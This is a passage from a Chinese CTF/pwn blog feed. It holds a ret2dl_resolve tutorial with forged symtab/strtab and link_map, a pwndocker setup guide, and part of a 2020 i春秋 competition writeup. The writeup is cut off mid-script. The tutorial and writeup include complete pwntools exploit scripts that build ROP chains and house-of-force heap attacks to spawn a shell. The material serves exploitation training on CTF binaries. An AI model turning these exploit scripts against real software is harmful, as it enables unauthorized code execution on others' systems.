0x7</p><p>伪造symtab，这一部分包含四个字段，我们只需要改st_name部分即可，其余部分按照程序原有的值赋值，st_name表示了字符串相对strtab的偏移，我们可以将字符串写在紧邻这一部分的高地址处</p><p>伪造strtab，这里我们直接将所需库函数的字符串写入即可，例如system<br>dl_runtime_resolve函数便会将system函数的地址，写到read函数对应的got表中去，再次调用read就相当于调用了system函数</p><p>利用思路如下:</p><p>第一次调用read函数，返回地址再溢出成read函数，这次参数给一个.bss的地址，里面放我们的payload，包括所有伪造的数据结构以及ROP。注意ROP要放在数据结构的前面，不然ROP调用时有可能污染我们伪造的数据结构，而且前面要预留一段空间给ROP所调用的函数用。调用完第二个read之后，ROP到leave; retn的地址，以便切栈切到在.bss中我们构造的下一个ROP链</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line">sh.send(payload1)</span><br></pre></td></tr></table></figure><p>第二次调用read函数，此时要sendROP链以及所有相关的伪造数据结构完整的exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">'./fun'</span>)</span><br><span class="line"></span><br><span class="line">pop_ebp_ret=<span class="number">0x080484ab</span></span><br><span class="line">leave_ret=<span class="number">0x08048378</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_stack_size=<span class="number">0x800</span></span><br><span class="line">bss=<span class="number">0x0804a01c</span></span><br><span class="line">read_plt=<span class="number">0x080482e0</span></span><br><span class="line">read_got=<span class="number">0x0804a00c</span></span><br><span class="line">bss_stage=bss+fake_stack_size</span><br><span class="line">dynsym=<span class="number">0x080481cc</span></span><br><span class="line">dynstr=<span class="number">0x0804821c</span></span><br><span class="line">dl_runtime_resolve=<span class="number">0x080482d0</span></span><br><span class="line">relplt=<span class="number">0x08048298</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rel_offset=bss_stage+<span class="number">28</span>-relplt</span><br><span class="line">fake_sym_addr=bss_stage+<span class="number">36</span></span><br><span class="line">align=<span class="number">0x10</span>-((fake_sym_addr-dynsym)&amp;<span class="number">0xf</span>) <span class="comment">#为了16字节对齐</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'align==&gt;'</span>+hex(align)</span><br><span class="line">fake_sym_addr=fake_sym_addr+align</span><br><span class="line">index=(fake_sym_addr-dynsym)/<span class="number">0x10</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'index==&gt;'</span>+hex(index)</span><br><span class="line">r_info=(index&lt;&lt;<span class="number">8</span>)|<span class="number">0x7</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'r_info==&gt;'</span>+hex(r_info)</span><br><span class="line"></span><br><span class="line">fake_raloc=p32(read_got)+p32(r_info)</span><br><span class="line">st_name=fake_sym_addr-dynstr+<span class="number">16</span></span><br><span class="line">fake_sym=p32(st_name)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)+p8(<span class="number">0x12</span>)+p8(<span class="number">0</span>)+p16(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload1 = <span class="string">'a'</span>*<span class="number">0x2C</span> </span><br><span class="line">payload1 += p32(pop_ebp_ret) + p32(bss + <span class="number">0x800</span>) </span><br><span class="line">payload1 += p32(read_plt) + p32(leave_ret) + p32(<span class="number">0</span>) + p32(bss_stage) + p32(<span class="number">0x1000</span>)</span><br><span class="line"></span><br><span class="line">p.send(payload1)</span><br><span class="line"></span><br><span class="line">binsh=<span class="string">'/bin/sh'</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(dl_runtime_resolve)</span><br><span class="line">payload+=p32(rel_offset)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=p32(bss_stage+<span class="number">80</span>)</span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=<span class="string">'aaaa'</span></span><br><span class="line">payload+=fake_raloc</span><br><span class="line">payload+=<span class="string">'a'</span>*align</span><br><span class="line">payload+=fake_sym</span><br><span class="line">payload+=<span class="string">'system\0'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">80</span>-len(payload))</span><br><span class="line">payload+=binsh+<span class="string">'\x00'</span></span><br><span class="line">payload+=<span class="string">'a'</span>*(<span class="number">100</span>-len(payload))</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></p><h3 id="伪造link-map"><a href="#伪造link-map" class="headerlink" title="伪造link_map"></a>伪造link_map</h3><p>64位情况下，伪造rel.plt变得不可行，因为在</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>) </span><br><span class="line">  &#123; </span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=(<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]); </span><br><span class="line">    ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>; </span><br><span class="line">    version = &amp;l-&gt;l_versions[ndx]; </span><br><span class="line">    <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>) </span><br><span class="line">      version = <span class="literal">NULL</span>; </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里，出现了访问未映射的内存<br>主要是reloc-&gt;r_info过大的原因，因为我们在bss段伪造的数据，而bss段一般位于0x600000<br>然后真正的rel.plt位于0x400000内，导致过大。<br>如果我们在里0x400000处有可读写的区域，或许就可以成功 </p><p>因此，我们得另外想办法，那么得回过来看源代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>) &#123;  </span><br><span class="line">        ...  </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">        <span class="comment">/* We already found the symbol.  The module (and therefore its load </span></span><br><span class="line"><span class="comment">        address) is also known.  */</span>  </span><br><span class="line">        value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);  </span><br><span class="line">        result = l;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>我们到最外层的else里去，如果，我们伪造link_map，让sym-&gt;st_value为某个已经解析了的函数的地址,比如read，让l-&gt;l_addr为我们需要的函数(system)到read的偏移,这样,l-&gt;l_addr + sym-&gt;st_value就是我们需要的函数地址</p><p>如果，我们把read_got – 0x8处开始当成sym，那么sym-&gt;st_value就是read的地址，并且sym-&gt;st_other正好也不为0，绕过了if，一举两得</p><p>为了伪造link_map，我们需要知道link_map的结构，在glibc/include/link.h文件里，link_map结构比较复杂，但是，我们只需伪造需要用到的数据即可,</p><p>以jiavis oj level3_x64为例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">elf = ELF(<span class="string">'./level3_x64'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">p = process(<span class="string">'./level3_x64'</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p,'b*0x400618')</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">typedef struct            </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    Elf64_Word    st_name;        /* Symbol name (string tbl index) */</span></span><br><span class="line"><span class="string">      unsigned char    st_info;    /* Symbol type and binding */        </span></span><br><span class="line"><span class="string">      unsigned char st_other;        /* Symbol visibility */              </span></span><br><span class="line"><span class="string">      Elf64_Section    st_shndx;    /* Section index */                  </span></span><br><span class="line"><span class="string">      Elf64_Addr    st_value;        /* Symbol value */                   </span></span><br><span class="line"><span class="string">      Elf64_Xword    st_size;        /* Symbol size */                    </span></span><br><span class="line"><span class="string">&#125;Elf64_Sym;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct           </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Addr    r_offset;        /* Address */                         </span></span><br><span class="line"><span class="string">  Elf64_Xword    r_info;            /* Relocation type and symbol index */</span></span><br><span class="line"><span class="string">  Elf64_Sxword    r_addend;        /* Addend */                          </span></span><br><span class="line"><span class="string">&#125;Elf64_Rela;</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">typedef struct          </span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">  Elf64_Sxword    d_tag;            /* Dynamic entry type */</span></span><br><span class="line"><span class="string">  union</span></span><br><span class="line"><span class="string">    &#123;</span></span><br><span class="line"><span class="string">      Elf64_Xword d_val;        /* Integer value */</span></span><br><span class="line"><span class="string">      Elf64_Addr d_ptr;            /* Address value */</span></span><br><span class="line"><span class="string">    &#125; d_un;</span></span><br><span class="line"><span class="string">&#125;Elf64_Dyn;</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"> </span><br><span class="line">universal_gadget1 = <span class="number">0x4006AA</span></span><br><span class="line">universal_gadget2 = <span class="number">0x400690</span></span><br><span class="line"> </span><br><span class="line">Elf64_Sym_len = <span class="number">0x18</span></span><br><span class="line">Elf64_Rela_len = <span class="number">0x18</span></span><br><span class="line">write_addr = <span class="number">0x600ad0</span></span><br><span class="line">link_map_addr = write_addr+<span class="number">0x18</span></span><br><span class="line">rbp = write_addr<span class="number">-8</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x4006b3</span></span><br><span class="line">leave = <span class="number">0x400618</span></span><br><span class="line">main = <span class="number">0x4005E6</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_STR_addr = l+0x68  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_SYM_addr = l+0x70  </span></span><br><span class="line"><span class="comment">#fake_Elf64_Dyn_JMPREL_addr = l+0xf8</span></span><br><span class="line"> </span><br><span class="line">l_addr = libc.sym[<span class="string">'system'</span>] - libc.sym[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="comment">#l-&gt;l_addr + sym-&gt;st_value</span></span><br><span class="line"><span class="comment"># value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fake_link_map_gen</span><span class="params">(link_map_addr,l_addr,st_value)</span>:</span></span><br><span class="line">    fake_Elf64_Dyn_JMPREL_addr = link_map_addr + <span class="number">0x18</span></span><br><span class="line">    fake_Elf64_Dyn_SYM_addr = link_map_addr + <span class="number">8</span></span><br><span class="line">    fake_Elf64_Dyn_STR_addr = link_map_addr</span><br><span class="line">    fake_Elf64_Dyn_JMPREL = p64(<span class="number">0</span>) + p64(link_map_addr+<span class="number">0x28</span>)</span><br><span class="line">    fake_Elf64_Dyn_SYM = p64(<span class="number">0</span>) + p64(st_value<span class="number">-8</span>)</span><br><span class="line">    fake_Elf64_rela = p64(link_map_addr - l_addr) + p64(<span class="number">7</span>) + p64(<span class="number">0</span>)</span><br><span class="line"> </span><br><span class="line">    fake_link_map = p64(l_addr)            <span class="comment">#0x8</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_SYM    <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_Dyn_JMPREL <span class="comment">#0x10</span></span><br><span class="line">    fake_link_map += fake_Elf64_rela       <span class="comment">#0x18</span></span><br><span class="line">    fake_link_map += <span class="string">'\x00'</span>*<span class="number">0x28</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_STR_addr) <span class="comment">#link_map_addr + 0x68</span></span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_SYM_addr) <span class="comment">#link_map_addr + 0x70</span></span><br><span class="line">    fake_link_map += <span class="string">'/bin/sh\x00'</span>.ljust(<span class="number">0x80</span>,<span class="string">'\x00'</span>)</span><br><span class="line">    fake_link_map += p64(fake_Elf64_Dyn_JMPREL_addr)</span><br><span class="line">    <span class="keyword">return</span> fake_link_map</span><br><span class="line">fake_link_map = fake_link_map_gen(link_map_addr,l_addr,elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span></span><br><span class="line">payload += p64(rbp)</span><br><span class="line">payload += p64(universal_gadget1)</span><br><span class="line">payload += p64(<span class="number">0</span>)  <span class="comment">#pop rbx</span></span><br><span class="line">payload += p64(<span class="number">1</span>)  <span class="comment">#pop rbp</span></span><br><span class="line">payload += p64(elf.got[<span class="string">'read'</span>])  <span class="comment">#pop r12</span></span><br><span class="line">payload += p64(len(fake_link_map)+<span class="number">0x18</span>) <span class="comment">#pop r13</span></span><br><span class="line">payload += p64(write_addr)  <span class="comment">#pop r14</span></span><br><span class="line">payload += p64(<span class="number">0</span>)           <span class="comment">#pop r15</span></span><br><span class="line">payload += p64(universal_gadget2)  <span class="comment">#ret</span></span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">7</span></span><br><span class="line">payload += p64(main)</span><br><span class="line"> </span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload.ljust(<span class="number">0x200</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line">fake_info = p64(<span class="number">0x4004A6</span>)        <span class="comment">#jmp</span></span><br><span class="line">fake_info += p64(link_map_addr)</span><br><span class="line">fake_info += p64(<span class="number">0</span>)</span><br><span class="line">fake_info += fake_link_map</span><br><span class="line">p.send(fake_info)</span><br><span class="line"> </span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0x80</span>+p64(rbp)+p64(pop_rdi_ret)+p64(link_map_addr+<span class="number">0x78</span>)+p64(leave)</span><br><span class="line"><span class="comment">#stack pivot,进入函数重定向</span></span><br><span class="line">p.sendafter(<span class="string">'Input:\n'</span>,payload)</span><br><span class="line"> </span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;参考链接:&lt;br&gt;&lt;a href=&quot;https://www.freebuf.com/articles/system/170661.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.freebuf.com/articles/sy
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>skysider/pwndocker 正确使用姿势</title>
    <link href="https://nocbtm.github.io/2020/02/24/skysider-pwndocker-%E6%AD%A3%E7%A1%AE%E4%BD%BF%E7%94%A8%E5%A7%BF%E5%8A%BF/"/>
    <id>https://nocbtm.github.io/2020/02/24/skysider-pwndocker-正确使用姿势/</id>
    <published>2020-02-24T03:27:00.000Z</published>
    <updated>2020-04-09T01:58:53.037Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。<br>一种可行的方案就是，装个16.04的虚拟机，然后在此之上装个18.04的docker，而且这个docker已经集成pwn常用工具以及各个版本libc。<br>具体参考 <a href="https://github.com/skysider/pwndocker" target="_blank" rel="noopener">https://github.com/skysider/pwndocker</a></p><h2 id="18-04-pwndocker-安装"><a href="#18-04-pwndocker-安装" class="headerlink" title="18.04 pwndocker 安装"></a>18.04 pwndocker 安装</h2><p>docker hub 可以直接pull<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull skysider/pwndocker</span><br></pre></td></tr></table></figure></p><p>但是pull的太慢了，我已经把他传到了阿里云上,用下面这条命令即可</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0</span><br></pre></td></tr></table></figure><p>pull完之后重命名一下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker tag registry.cn-hangzhou.aliyuncs.com/pwndocker/pwndocker-nocbtm:1.0 skysider/pwndocker</span><br></pre></td></tr></table></figure><h2 id="使用姿势"><a href="#使用姿势" class="headerlink" title="使用姿势"></a>使用姿势</h2><p>建议用官方的使用姿势，用如下命令run起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">--rm \</span><br><span class="line">-h $&#123;ctf_name&#125; \</span><br><span class="line">--name $&#123;ctf_name&#125; \</span><br><span class="line">-v $(pwd)/$&#123;ctf_name&#125;:/ctf/work \</span><br><span class="line">-p 23946:23946 \</span><br><span class="line">--cap-add=SYS_PTRACE \</span><br><span class="line">skysider/pwndocker</span><br></pre></td></tr></table></figure><p>其中有两个重要的参数<br>-v $(pwd)/${ctf_name}:/ctf/work 是将当前目录下的文件映射到 docker /ctf/work目录下<br>这样你在物理机修改文件，docker里面也会发生变化，就不用再docker cp了</p><p>–cap-add=SYS_PTRACE 这个参数也是要一定加的，不然docker里面没法用gdb调试。</p><p>可以把上述命令放到 pwndocker_run.sh里面 方便下次使用<br><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-1.png" class="lozad"></p><p>然后调试脚本时，要先进去tmux ，python脚本里面指定终端为 tmux<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;]</span><br></pre></td></tr></table></figure></p><p>就可以 gdb.attach(p)了 如下图</p><p><img alt="" data-src="https://nocbtm.github.io/imgs/pwndocker-2.png" class="lozad"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;现在pwn题是越来越高版本的libc，一场比赛ubuntu16.04，ubuntu18.04切来切去的十分难受。&lt;br&gt;一种可行的方案就是，
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>2020 i春秋公益赛pwn writeup</title>
    <link href="https://nocbtm.github.io/2020/02/22/2020-i%E6%98%A5%E7%A7%8B%E5%85%AC%E7%9B%8A%E8%B5%9Bpwn-writeup/"/>
    <id>https://nocbtm.github.io/2020/02/22/2020-i春秋公益赛pwn-writeup/</id>
    <published>2020-02-22T11:25:47.000Z</published>
    <updated>2020-04-01T02:12:55.941Z</updated>
    
    <content type="html"><![CDATA[<h2 id="force"><a href="#force" class="headerlink" title="force"></a>force</h2><p>标准的house of force，先申请较大的内存页，可泄露出libc基址，<br>然后申请较小堆块，溢出修改top chunk的size为0xffffffffffffffff,申请堆块到__malloc_hook附近，这里用onegadget，不满足条件，可修改为system函数，然后申请”/bin/sh”所在地址的堆块，即可getshell</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">offset = 0x4ff010#0x4aa010#0x4ec010#</span><br><span class="line">while True:</span><br><span class="line">warn(hex(offset))</span><br><span class="line">try:    </span><br><span class="line">    p = process(&apos;./pwn&apos;)</span><br><span class="line">    #p = remote(&apos;123.56.85.29&apos;,7147)</span><br><span class="line">    def add(size,content):</span><br><span class="line">        p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">        p.sendlineafter(&apos;size&apos;,str(size))</span><br><span class="line">        p.recvuntil(&apos;addr &apos;)</span><br><span class="line">        addr = int(p.recvuntil(&apos;\n&apos;,drop = True),16)</span><br><span class="line">        p.sendafter(&apos;content&apos;,content)</span><br><span class="line">        return addr</span><br><span class="line"></span><br><span class="line">    chunk1 = add(0x100000,&apos;aaaa&apos;)</span><br><span class="line"></span><br><span class="line">    info(hex(chunk1))</span><br><span class="line">    libc = chunk1 - offset</span><br><span class="line">    info(hex(libc))</span><br><span class="line"></span><br><span class="line">    chunk2 = add(0x28,&apos;\xff&apos;*0x30)+0x20</span><br><span class="line">    info(hex(chunk2))</span><br><span class="line"></span><br><span class="line">    mallochook = libc+0x3c4b10</span><br><span class="line">    chunk3 = add(mallochook-chunk2-0x20,&apos;bbbb&apos;)</span><br><span class="line"></span><br><span class="line">    chunk4 = add(0x20,p64(libc+0x45390)*4)</span><br><span class="line">    #gdb.attach(p)</span><br><span class="line">    #pause()</span><br><span class="line">    p.sendlineafter(&apos;1:&apos;,&apos;1&apos;)</span><br><span class="line">    p.sendafter(&apos;size&apos;,str(libc+0x18cd57))</span><br><span class="line">    print(p.recv())</span><br><span class="line">    p.interactive()</span><br><span class="line">    </span><br><span class="line">except Exception as e:</span><br><span class="line">    offset-=0x1000</span><br><span class="line">    p.close()</span><br><span class="line">    pass</span><br></pre></td></tr></table></figure><h2 id="BorrowStack"><a href="#BorrowStack" class="headerlink" title="BorrowStack"></a>BorrowStack</h2><p>栈溢出0x10字节，栈迁移到bss段后，构造rop链。<br>需要注意的是，要尽量迁移到距离bss段更远的地址，为了防止bss段上面的got表被修改。<br>因为在调用函数时，栈由高地址向低地址生长，可能会修改到got表里面的内容。</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">def pwn():</span><br><span class="line">offest=152</span><br><span class="line"></span><br><span class="line">#while (1):</span><br><span class="line">try:</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">p=process(&apos;./pwn&apos;)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">p=remote(&apos;123.56.85.29&apos;,3635)</span><br><span class="line">libc=ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">elf=ELF(&apos;./pwn&apos;)</span><br><span class="line">bss_addr=0x601080</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span class="line">#gdb.attach(p, &quot;b *0x400680&quot;)</span><br><span class="line">payload=&apos;a&apos;*0x60+p64(bss_addr+offest)+p64(0x400699)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(&apos;\n&apos;)</span><br><span 